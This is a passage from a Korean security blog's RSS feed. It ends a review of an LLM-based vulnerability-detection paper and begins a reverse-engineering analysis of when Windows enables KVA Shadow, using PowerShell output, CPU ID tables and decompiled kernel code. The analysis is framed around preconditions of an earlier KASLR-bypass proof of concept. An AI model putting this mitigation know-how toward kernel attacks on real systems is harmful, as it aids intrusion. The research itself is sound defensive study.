&#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB450; &#xAC19;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC744; &#xB54C;, CoT, MoA, rStar &#xB4F1; &#xC5EC;&#xB7EC; &#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD55C; &#xAC83;&#xACFC; &#xBE44;&#xAD50;&#xD55C; &#xAC83;&#xB3C4; &#xC88B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; self-attention &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC9C0;&#xC5D0; &#xC0AC;&#xC6A9;&#xD588;&#xB2E4;&#xB294; &#xC2DC;&#xB3C4;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xC758;&#xBBF8;&#xAC00; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="5-&#xC544;&#xC26C;&#xC6B4;-&#xC810;"><a href="#5-&#xC544;&#xC26C;&#xC6B4;-&#xC810;" class="headerlink" title="5. &#xC544;&#xC26C;&#xC6B4; &#xC810;"></a>5. &#xC544;&#xC26C;&#xC6B4; &#xC810;</h1><ol><li>&#xB354; &#xD070; &#xBAA8;&#xB378;&#xACFC;&#xC758; &#xBE44;&#xAD50; &#xBD80;&#xC7AC;<ul><li>&#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, Phi3.5-mini-instruct&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD588;&#xC9C0;&#xB9CC; &#xC774;&#xBCF4;&#xB2E4; &#xD070; &#xBAA8;&#xB378;&#xACFC;&#xC758; &#xBE44;&#xAD50;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xC758; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAC01; &#xCF54;&#xB4DC; &#xB77C;&#xC778;&#xB9C8;&#xB2E4; &#xC5B4;&#xD150;&#xC158; &#xBA54;&#xD2B8;&#xB9AD;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774; &#xB54C; &#xAC78;&#xB9AC;&#xB294; &#xC2DC;&#xAC04;&#xC774;&#xB098; &#xC5F0;&#xC0B0;&#xD574;&#xC57C;&#xD560; &#xD589;&#xB82C;&#xC774; &#xB354; &#xB9CE;&#xC544;&#xC838; &#xD070; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xAC00; &#xBD80;&#xC871;&#xD588;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xAE34; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xB354; &#xD070;&#xBAA8;&#xB378;&#xC758; &#xBC14;&#xB2D0;&#xB77C; &#xC544;&#xC6C3;&#xD48B;&#xACFC;&#xC758; &#xBE44;&#xAD50;&#xC815;&#xB3C4;&#xB294; &#xD574;&#xBD10;&#xB3C4; &#xC88B;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xB124;&#xC694;.(&#xC544; &#xC774;&#xAC74; &#xB0B4;&#xAC00; &#xD574;&#xBCF4;&#xBA74; &#xB418;&#xB098;&#x2026;?) &#xB354; &#xD070; &#xBAA8;&#xB378;&#xC758; &#xBC14;&#xB2D0;&#xB77C; &#xC544;&#xC6C3;&#xD48B;&#xACFC; &#xBE44;&#xBE4C;&#xB9CC;&#xD558;&#xB2E4;&#x2026;! &#xC815;&#xB3C4;&#xB85C;&#xB9CC; &#xB098;&#xC640;&#xB3C4; &#xC758;&#xBBF8;&#xC788;&#xC73C;&#xB824;&#xB098;&#x2026;?</li></ul></li><li>&#xC804;&#xB825; &#xD6A8;&#xC728;&#xC131; &#xB610;&#xB294; &#xACC4;&#xC0B0; &#xBE44;&#xC6A9; &#xBE44;&#xAD50; &#xBD80;&#xC7AC;<ul><li>LOVA&#xB294; &#xAC01; &#xCF54;&#xB4DC; &#xB77C;&#xC778;&#xC744; &#xAC1C;&#xBCC4;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xD558;&#xC5EC; &#xC5EC;&#xB7EC; &#xBC84;&#xC804;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC774;&#xB4E4; &#xAC04;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xB9F5; &#xCC28;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xB4F1; &#xC5EC;&#xB7EC; &#xB2E8;&#xACC4;&#xB97C; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xCC28;&#xC6D0; &#xCD95;&#xC18C; &#xBC0F; Bi-LSTM &#xBD84;&#xB958;&#xAE30; &#xC0AC;&#xC6A9;&#xC740; &#xBCF5;&#xC7A1;&#xB3C4;&#xB97C; &#xB354;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xB17C;&#xBB38;&#xC740; &#xC2E4;&#xC81C; &#xB300;&#xADDC;&#xBAA8; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xC801;&#xC6A9;&#xB420; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC2DC;&#xAC04;&#xC801;, &#xC7AC;&#xC815;&#xC801; &#xBE44;&#xC6A9;&#xC5D0; &#xB300;&#xD55C; &#xC5B8;&#xAE09;&#xC774; &#xBD80;&#xC871;&#xD569;&#xB2C8;&#xB2E4;. &#xB370;&#xC774;&#xD130;&#xC14B; &#xBE44;&#xAD50;&#xB294; &#xC131;&#xB2A5; &#xBE44;&#xAD50; &#xCC28;&#xC6D0;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC88B;&#xC9C0;&#xB9CC; &#xCF54;&#xB4DC;&#xC591;&#xC774; &#xB298;&#xC5B4;&#xB0AC;&#xC744; &#xB54C; &#xC5BC;&#xB9C8;&#xB098; &#xB354; &#xB9CE;&#xC740; &#xACC4;&#xC0B0;&#xC744; &#xD574;&#xC57C;&#xD558;&#xB294;&#xC9C0; &#xCE21;&#xC815;&#xD558;&#xB294; &#xB0B4;&#xC6A9;&#xC774; &#xC788;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xC744;&#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xB17C;&#xBB38;&#xC740; LLM&#xC758; &#xC785;&#xB825; &#xC81C;&#xC57D;&#xC0AC;&#xD56D;&#xC744; &#xC900;&#xC218;&#xD558;&#xAE30; &#xC704;&#xD574; 4,000 &#xD1A0;&#xD070;&#xC744; &#xCD08;&#xACFC;&#xD558;&#xB294; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD588;&#xB2E4;&#xACE0; &#xC5B8;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.)</li></ul></li></ol><p>&#xD6C4;&#x2026; &#xC774;&#xBC88; &#xD3EC;&#xC2A4;&#xD305;&#xC740; &#xC774;&#xC815;&#xB3C4;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C1;&#xC811; &#xAC1C;&#xBC1C;&#xD574;&#xC11C; 2&#xD3B8;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xAE4C;&#x2026;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD574;&#xBCF4;&#xC558;&#xC9C0;&#xB9CC;&#x2026; &#xC81C; &#xD604;&#xC0DD;&#xC774; &#xC800;&#xD55C;&#xD14C; &#xD5C8;&#xB77D;&#xD574;&#xC8FC;&#xC9C0; &#xC54A;&#xC744;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C; &#xD3B8;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! (&#xC774;&#xC81C;&#xB294; &#xC9C4;&#xC9DC; Usenix &#xBD10;&#xC57C;&#xC9C0;&#x2026;)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/Transformer/">Transformer</category>
      
      <category domain="https://hackyboiz.github.io/tags/Attention/">Attention</category>
      
      <category domain="https://hackyboiz.github.io/tags/Automated-vulnerability-Detection/">Automated vulnerability Detection</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Deep Dive into KVA Shadow&#39;s Dynamic Activation Mechanism(Ko)</title>
      <link>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/ko/</guid>
      <pubDate>Sun, 10 Aug 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;!  &amp;#xC9C0;&amp;#xB09C; &amp;#xBC88; &amp;#xAE00; &amp;#xC774;&amp;#xD6C4;&amp;#xB85C; &amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, L0ch&#xC785;&#xB2C8;&#xB2E4;!  &#xC9C0;&#xB09C; &#xBC88; &#xAE00; &#xC774;&#xD6C4;&#xB85C; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;</p><p>&#xC9C0;&#xB09C; &#xC8FC;&#xC81C;&#xB294; <a href="https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/">[Research] Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction</a> &#xC600;&#xC5C8;&#xB294;&#xB370;&#xC694;, KASLR &#xC6B0;&#xD68C; PoC&#xC758; &#xB3D9;&#xC791; &#xC870;&#xAC74; &#xC911; &#xD558;&#xB098;&#xAC00; KVA Shadow &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB2E4;! &#xB77C;&#xB294; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xC131; &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; &#xCD5C;&#xC2E0; Windows 11&#xC5D0;&#xC11C;&#xB294; KVAS&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xACE0; &#xCD94;&#xCE21;&#xD588;&#xC5C8;&#xB294;&#xB370;, &#xD53C;&#xB4DC;&#xBC31;&#xC744; &#xD1B5;&#xD574; KVAS&#xB294; Windows &#xBC84;&#xC804; &#xAE30;&#xC900;&#xC774; &#xC544;&#xB2CC; CPU &#xBAA8;&#xB378;&#xACFC; &#xD2B9;&#xC815; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="SpeculationControl-PowerShell-script"><a href="#SpeculationControl-PowerShell-script" class="headerlink" title="SpeculationControl PowerShell script"></a><strong>SpeculationControl PowerShell script</strong></h1><p>KVAS&#xB294; Meltdown, Spectre&#xB85C; &#xB300;&#xD45C;&#xB418;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAE30;&#xBC18; &#xC0AC;&#xC774;&#xB4DC;&#xCC44;&#xB110; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xBC00;&#xC811;&#xD55C; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB294; &#xB9CC;&#xD07C;, &#xAD00;&#xB828; MS&#xC758; &#xC9C0;&#xC6D0; &#xC815;&#xBCF4;&#xB97C; &#xC27D;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p>&#xC81C; &#xCEF4;&#xD4E8;&#xD130;&#xC778; 12&#xC138;&#xB300; Intel CPU&#xB85C; &#xD14C;&#xC2A4;&#xD2B8;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs powershell"><span class="hljs-comment"># Windwos 11 24H2 - Intel 12th i7-12700</span><span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> SpeculationControl                                                                                                                                                                                 &#xACC4;&#xC18D;&#xD558;&#xB824;&#xBA74; NuGet &#xACF5;&#xAE09;&#xC790;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.<span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Get-SpeculationControlSettings</span>BTIHardwarePresent                  : TrueBTIWindowsSupportPresent            : TrueBTIWindowsSupportEnabled            : TrueBTIDisabledBySystemPolicy           : FalseBTIDisabledByNoHardwareSupport      : FalseBTIKernelRetpolineEnabled           : FalseBTIKernelImportOptimizationEnabled  : TrueRdclHardwareProtectedReported       : TrueRdclHardwareProtected               : TrueKVAShadowRequired                   : FalseKVAShadowWindowsSupportPresent      : TrueKVAShadowWindowsSupportEnabled      : FalseKVAShadowPcidEnabled                : FalseSSBDWindowsSupportPresent           : TrueSSBDHardwareVulnerable              : TrueSSBDHardwarePresent                 : TrueSSBDWindowsSupportEnabledSystemWide : FalseL1TFHardwareVulnerable              : FalseL1TFWindowsSupportPresent           : TrueL1TFWindowsSupportEnabled           : FalseL1TFInvalidPteBit                   : <span class="hljs-number">0</span>L1DFlushSupported                   : TrueHvL1tfStatusAvailable               : TrueHvL1tfProcessorNotAffected          : TrueMDSWindowsSupportPresent            : TrueMDSHardwareVulnerable               : FalseMDSWindowsSupportEnabled            : FalseFBClearWindowsSupportPresent        : TrueSBDRSSDPHardwareVulnerable          : FalseFBSDPHardwareVulnerable             : FalsePSDPHardwareVulnerable              : FalseFBClearWindowsSupportEnabled        : False</code></pre></p><div class="table-container"><table><thead><tr><th>Hardware requires kernel VA shadowing</th><th>Maps to KVAShadowRequired. This line tells you whether your system requires kernel VA shadowing to mitigate a vulnerability.</th></tr></thead><tbody><tr><td>Windows OS support for rogue data cache load mitigation is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present.</td></tr><tr><td>Windows OS support for kernel VA shadow is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present. If it is True, the January 2018 update is installed on the device, and kernel VA shadow is supported. If it is False, the January 2018 update is not installed, and kernel VA shadow support does not exist.</td></tr><tr><td>Windows OS support for rogue data cache load mitigation is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, the hardware is believed to be vulnerable to CVE-2017-5754, Windows operating system support is present, and the feature is enabled.</td></tr><tr><td>Windows OS support for kernel VA shadow is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, Windows operating system support is present, and the feature is enabled. The Kernel VA shadow feature is currently enabled by default on client versions of Windows and is disabled by default on versions of Windows Server. If it is False, either Windows operating system support is not present, or the feature is not enabled.</td></tr></tbody></table></div><pre><code class="hljs cpp">Windows&#xC5D0; KVA Shadow &#xAE30;&#xB2A5;&#xC740; &#xC874;&#xC7AC;&#xD558;&#xB098;(KVAShadowWindowsSupportPresent: True) &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C;(KVAShadowRequired: False) &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC740; &#xC0C1;&#xD0DC; (KVAShadowWindowsSupportEnabled: False)</code></pre><p>KVAS&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB294; &#xB2E4;&#xC2DC; &#xB9D0;&#xD558;&#xBA74; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; <strong>&#xD558;&#xB4DC;&#xC6E8;&#xC5B4;(CPU)&#xAC00; &#xCDE8;&#xC57D;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xAE30;&#xB2A5;&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5C8;&#xB2E4;</strong>&#xACE0; &#xB9D0;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. </p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; Windows&#xB294; &#xC5B4;&#xB514;&#xC11C;, &#xC5B4;&#xB5BB;&#xAC8C; &#xCDE8;&#xC57D;&#xD55C; CPU&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xD310;&#xB2E8;&#xD560;&#xAE4C;&#xC694;?</p><h1 id="Background-Knowledge-CPU-Identification"><a href="#Background-Knowledge-CPU-Identification" class="headerlink" title="Background Knowledge - CPU Identification"></a>Background Knowledge - CPU Identification</h1><p>Windows&#xB294; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; CPU&#xC758; &#xBCA4;&#xB354;&#xB97C; &#xC2DD;&#xBCC4;&#xD569;&#xB2C8;&#xB2E4;. <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">CPU_VENDORS</a> Enum&#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xB4EF;&#xC774;, &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC81C;&#xC870;&#xC0AC;&#xB294; 0, AMD&#xB294; 1, Intel&#xC740; 2&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC8E0;.</p><pre><code class="hljs jsx">typedef enum{    CPU_UNKNOWN,   <span class="hljs-comment">// 0</span>    CPU_AMD,       <span class="hljs-comment">// 1</span>    CPU_INTEL,     <span class="hljs-comment">// 2</span>    CPU_VIA        <span class="hljs-comment">// 3</span>} CPU_VENDORS;</code></pre><p>&#xBCA4;&#xB354;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; Faily ID, Model ID &#xC640; &#xAC19;&#xC740; CPU &#xC815;&#xBCF4;&#xB4E4;&#xC740; <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">KPRCB</a> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB7EC;&#xD55C; ID&#xB4E4;&#xC740; &#xAC01; CPU &#xBCA4;&#xB354;&#xC0AC;&#xAC00; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. Intel&#xC758; &#xACBD;&#xC6B0; Intel CPU &#xC81C;&#xD488;&#xC758; Family ID, Model ID, &#xC138;&#xB300; &#xC815;&#xBCF4;&#xB97C; <a href="https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html">Intel Developer Manual</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, 5000&#xC7A5;&#xC774; &#xB118;&#xB294; &#xB9E4;&#xB274;&#xC5BC;&#xC744; &#xC804;&#xBD80; &#xBCFC; &#xC218;&#xB294; &#xC5C6;&#xC73C;&#xB2C8;.. gemini &#xC2DC;&#xCF1C;&#xC11C; &#xC544;&#xB798; &#xD45C;&#xB85C; &#xC815;&#xB9AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><div class="table-container"><table><thead><tr><th><strong>&#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC544;&#xD0A4;&#xD14D;&#xCC98; (&#xC138;&#xB300;)</strong></th><th><strong>&#xD504;&#xB85C;&#xC138;&#xC11C; &#xC81C;&#xD488;&#xAD70;</strong></th><th><strong>Family ID (Hex)</strong></th><th><strong>Model ID (Hex)</strong></th></tr></thead><tbody><tr><td>Raptor Lake (13&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>B7H, BFH</td></tr><tr><td>Alder Lake (12&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>97H, 9AH</td></tr><tr><td>Tiger Lake (11&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8CH, 8DH</td></tr><tr><td>Rocket Lake (11&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>A7H</td></tr><tr><td>Ice Lake (10&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>7DH, 7EH</td></tr><tr><td>Comet Lake (10&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>A5H, A6H</td></tr><tr><td>Amber Lake Y (8&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Whiskey Lake U (8&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Coffee Lake (8, 9&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>9EH</td></tr><tr><td>Kaby Lake (7&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8EH, 9EH</td></tr><tr><td>Skylake (6&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>4EH, 5EH, 55H</td></tr><tr><td>Broadwell (5&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>3DH, 47H, 4FH</td></tr><tr><td>Haswell (4&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>3CH, 45H, 46H, 3FH</td></tr><tr><td>Ivy Bridge (3&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>3AH</td></tr><tr><td>Sandy Bridge (2&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>2AH</td></tr><tr><td>Westmere (2010)</td><td>Intel Core</td><td>06H</td><td>25H, 2CH, 2FH</td></tr><tr><td>Nehalem (1&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>1AH, 1EH, 1FH, 2EH</td></tr><tr><td>Penryn</td><td>Core 2 Duo/Quad</td><td>06H</td><td>17H, 1DH</td></tr><tr><td>Merom</td><td>Core 2 Duo</td><td>06H</td><td>0FH</td></tr><tr><td>Yonah</td><td>Core Duo/Solo</td><td>06H</td><td>0EH</td></tr></tbody></table></div><p>AMD&#xB098; &#xB2E4;&#xB978; &#xBCA4;&#xB354;&#xB4E4;&#xC758; ID &#xB9AC;&#xC2A4;&#xD2B8;&#xB3C4; &#xBAA8;&#xB450; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Analysis-of-KVAS-Activation-Logic"><a href="#Analysis-of-KVAS-Activation-Logic" class="headerlink" title="Analysis of KVAS Activation Logic"></a>Analysis of KVAS Activation Logic</h1><p>&#xBD84;&#xC11D; &#xD658;&#xACBD;: Windows 24H2 64bit 10.0.26100.1742 </p><p>&#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC640;&#xC11C;, &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xCD08;&#xAE30;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Windows &#xBD80;&#xD305; &#xC2DC; &#xCEE4;&#xB110;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xAE4C;&#xC9C0; &#xB4E4;&#xC5B4;&#xAC00;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.  </p><p>Windows &#xCEE4;&#xB110; &#xC774;&#xBBF8;&#xC9C0; <code>ntoskrnl.exe</code>&#xC758; Entry Point&#xB294; <code>KiSystemStartup</code> &#xC73C;&#xB85C;, CPU &#xCD08;&#xAE30;&#xD654;&#xBD80;&#xD130; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xAD00;&#xB828;&#xB41C; Feature &#xC138;&#xD305; &#xC218;&#xD589;, &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAC70; &#xCD08;&#xAE30;&#xD654; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; &#xC758;&#xC678;&#xB85C; &#xAE08;&#xBC29; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>KiSystemStartup &#x2192; KiInitializeBootStructures &#x2192; KiSetFeatureBits &#x2192; KiDetectKvaLeakage</li></ul><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall __noreturn <span class="hljs-title">KiSystemStartup</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//...</span>  KeLoaderBlock_0 = (__int64)DriverObject;  <span class="hljs-keyword">if</span> ( !*((_DWORD *)DriverObject-&gt;MajorFunction[<span class="hljs-number">3</span>] + <span class="hljs-number">9</span>) )    KasanInitSystem(DriverObject, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*(_QWORD *)(KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0xFFFFFFFF</span>i64, KeLoaderBlock_0);  v2 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> **)(KeLoaderBlock_0 + <span class="hljs-number">136</span>);<span class="hljs-comment">//...</span>  KiInitializeBootStructures(KeLoaderBlock_0);  <span class="hljs-comment">// Initialize Boot Structures</span>  <span class="hljs-keyword">if</span> ( !*MK_FP(<span class="hljs-number">43</span>, *MK_FP(<span class="hljs-number">43</span>, KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0</span>i64, KeLoaderBlock_0);<span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiInitializeBootStructures</span><span class="hljs-params">(__int64 a1)</span></span><span class="hljs-function"></span>{  KPCR *Pcr; <span class="hljs-comment">// r14</span>  _KPROCESS **v2; <span class="hljs-comment">// rbx</span>  <span 